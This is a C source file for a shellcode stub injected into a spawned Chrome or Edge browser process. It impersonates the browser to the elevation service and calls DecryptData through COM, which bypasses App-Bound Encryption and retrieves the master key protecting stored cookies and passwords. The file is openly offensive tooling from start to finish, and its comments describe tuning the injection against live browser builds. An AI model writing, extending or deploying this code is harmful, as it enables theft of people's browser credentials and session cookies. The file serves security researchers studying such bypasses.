// stub.c: position-independent COM stub, runs inside the spawned browser
// process. Zero imports, zero globals, no CRT: every call goes through the
// param struct. Compiled with:
//   cl /nologo /TC /c /O2 /Os /GS- /GR- /EHs-c- /Zl stub.c
//
// Extractor (extract_stub.py) locates the "stub_entry" symbol in the COFF
// symbol table, pulls .text, and emits stub_blob.h. No relocations may exist
// against .text; the build asserts this.
//
// Why this shape: the elevation service validates the caller purely by image
// path (caller_validation.cc, M157). Running inside genuine chrome.exe
// or msedge.exe spawned from the real install directory, it passes as exactly
// the process identity the key was bound to. DecryptData is vtable slot 5 on
// the standard Chromium layout; Edge's final flavor prefixes three methods,
// pushing it to slot 8. The candidate chain absorbs both. Each candidate
// also carries an apartment flag (see ABE_CAND_APT_MTA in abe_common.h).

#include "abe_common.h"

typedef long HRESULT;

typedef HRESULT (*PFN_COINIT)(void* reserved, abe_u32 apartment);
typedef HRESULT (*PFN_COCREATE)(const ABE_GUID* rclsid, void* outer,
                                abe_u32 clsctx, const ABE_GUID* riid,
                                void** ppv);
typedef HRESULT (*PFN_PROXYBLANKET)(void* proxy, abe_u32 authn_svc,
                                    abe_u32 authz_svc, void* principal,
                                    abe_u32 authn_level, abe_u32 imp_level,
                                    void* auth_info, abe_u32 capabilities);
typedef void* (*PFN_SYSALLOCBYTELEN)(const char* psz, unsigned int len);
typedef unsigned int (*PFN_SYSBYTELEN)(void* bstr);
typedef void (*PFN_SYSFREE)(void* bstr);
typedef void (*PFN_SLEEP)(abe_u32 ms);
typedef abe_u32 (*PFN_RELEASE)(void* punk);
typedef HRESULT (*PFN_DECRYPTDATA)(void* self, void* cipher_bstr,
                                   void** plain_bstr, abe_u32* last_error);

/* Fully inlined: .text must be a single function with zero COFF relocations
 * (the extractor asserts this; a raw load cannot resolve REL32 fixups). */
static __forceinline void copy_bytes(unsigned char* dst, const unsigned char* src,
                                     unsigned int n) {
    unsigned int i;
    for (i = 0; i < n; i++) dst[i] = src[i];
}

/* Walk one candidate. Returns 0 on key success, -1 to continue the chain.
 * *hr_out always receives the DecryptData (or CoCreate) HRESULT. */
static __forceinline void bc(ABE_PARAMS* p, abe_u32 step) {
    volatile abe_u32* b = (volatile abe_u32*)(p->out + ABE_SEC_BC);
    *b = step;
}

static __forceinline long try_candidate(const ABE_CANDIDATE* c, ABE_PARAMS* p,
                                        long* hr_out) {
    void* punk = 0;
    abe_u64* vtable;
    PFN_DECRYPTDATA decrypt;
    void* in_bstr;
    void* out_bstr = 0;
    abe_u32 last_error = 0;
    long hr;
    unsigned int n;
    PFN_COINIT co_init = (PFN_COINIT)p->pCoInitializeEx;
    PFN_COCREATE co_create = (PFN_COCREATE)p->pCoCreateInstance;
    PFN_PROXYBLANKET blanket = (PFN_PROXYBLANKET)p->pCoSetProxyBlanket;
    PFN_SYSALLOCBYTELEN alloc_bstr = (PFN_SYSALLOCBYTELEN)p->pSysAllocStringByteLen;
    PFN_SYSBYTELEN bstr_len = (PFN_SYSBYTELEN)p->pSysStringByteLen;
    PFN_SYSFREE free_bstr = (PFN_SYSFREE)p->pSysFreeString;
    PFN_RELEASE release = 0;

    /* Breadcrumbs land in the shared section BEFORE each call so a target
     * crash leaves the last completed step readable from the loader side. */
    bc(p, 1);
    /* Apartment: MTA (0) for Chrome; Edge defaults to STA (2), matching how
     * Edge's own browser threads host their COM (fresh-MTA remote threads
     * faulted in YOUNG Edge spawns on 157). Candidate flags bit 0 forces MTA:
     * on the LIVE Edge 158.0.4370.33 main browser, CoInitializeEx(NULL, STA)
     * from the injected remote thread access-violated and killed the browser
     * (bc=1, proc_exit=0xc0000005), so the Edge chain now leads with MTA and
     * keeps an STA candidate only as the last fallback. */
    co_init(0, (c->flags & ABE_CAND_APT_MTA) ? 0 : (c->slot == ABE_SLOT_EDGE ? 2 : 0));
    bc(p, 2);

    hr = co_create(&c->clsid, 0, 4 /* CLSCTX_LOCAL_SERVER */, &c->iid, &punk);
    *hr_out = hr;
    if (hr < 0 || punk == 0) return -1;
    bc(p, 3);

    vtable = *(abe_u64**)punk;
    release = (PFN_RELEASE)vtable[2];
    if (vtable == 0) { release(punk); return -1; }

    /* Mirror chrome/browser/os_crypt/app_bound_encryption_win.cc: PKT_PRIVACY
     * + IMPERSONATE + EOAC_DYNAMIC_CLOAKING. The service-side registration
     * may refuse lower-quality blankets. RPC_C_AUTHN_DEFAULT=0xFFFFFFFF,
     * RPC_C_AUTHZ_DEFAULT=0xFFFFFFFF, principal=NULL,
     * RPC_C_AUTHN_LEVEL_PKT_PRIVACY=6, RPC_C_IMP_LEVEL_IMPERSONATE=3,
     * EOAC_DYNAMIC_CLOAKING=0x40. */
    bc(p, 4);
    hr = blanket(punk, 0xFFFFFFFFu, 0xFFFFFFFFu, 0, 6, 3, 0, 0x40u);
    *hr_out = hr;
    if (hr < 0) { release(punk); return -1; }
    bc(p, 5);

    decrypt = (PFN_DECRYPTDATA)vtable[c->slot];
    in_bstr = alloc_bstr((const char*)p->blob, p->blob_len);
    if (in_bstr == 0) { release(punk); return -1; }

    bc(p, 6);
    hr = decrypt(punk, in_bstr, &out_bstr, &last_error);
    *hr_out = hr;
    bc(p, 7);
    free_bstr(in_bstr);
    if (hr < 0 || out_bstr == 0) { release(punk); return -1; }

    n = bstr_len(out_bstr);
    if (n > 32) n = 32;
    copy_bytes((unsigned char*)p->out + ABE_SEC_KEY,
               (const unsigned char*)out_bstr, n);

    free_bstr(out_bstr);
    release(punk);
    return 0;
}

void stub_entry(ABE_PARAMS* p) {
    volatile abe_u32* done = (volatile abe_u32*)(p->out + ABE_SEC_DONE);
    volatile abe_u32* out_hr = (volatile abe_u32*)(p->out + ABE_SEC_HR);
    const ABE_CANDIDATE* chain;
    abe_u32 count;
    abe_u32 i;
    long hr = 0;
    long ok = -1;
    PFN_SLEEP sleep_fn = (PFN_SLEEP)p->pSleep;

    /* Fallback: no chain supplied, single (clsid, iid, slot) from the header */
    if (p->candidates == 0 || p->ncand == 0) {
        ABE_CANDIDATE single;
        single.clsid = p->clsid;
        single.iid = p->iid;
        single.slot = p->slot;
        hr = 0;
        ok = try_candidate(&single, p, &hr);
    } else {
        chain = (const ABE_CANDIDATE*)p->candidates;
        count = p->ncand;
        /* hard safety cap: a loader-side layout drift (see extract_stub.py
         * PARAMS_SIZE note) once turned ncand into a GUID word and walked
         * millions of bogus candidates off the allocation, killing the
         * browser with 0xc0000005. No real chain needs more than 16. */
        if (count > 16) count = 16;
        for (i = 0; i < count; i++) {
            volatile abe_u32* cand_idx =
                (volatile abe_u32*)(p->out + ABE_SEC_CANDIDX);
            volatile abe_u32* last_hr =
                (volatile abe_u32*)(p->out + ABE_SEC_LASTHR);
            *cand_idx = i;
            hr = 0;
            ok = try_candidate(&chain[i], p, &hr);
            *last_hr = (abe_u32)hr;
            if (ok == 0) break;
        }
    }

    if (ok == 0) {
        *out_hr = 0;
        *done = ABE_DONE_OK;
    } else {
        *out_hr = (abe_u32)hr;
        *done = ABE_DONE_ERR;
    }

    /* Park the thread; the loader terminates the spawned process after it
     * reads the section. Sleep() is also a syscall boundary that guarantees
     * the section writes above are globally visible. */
    sleep_fn(0x7FFFFFFF);
}
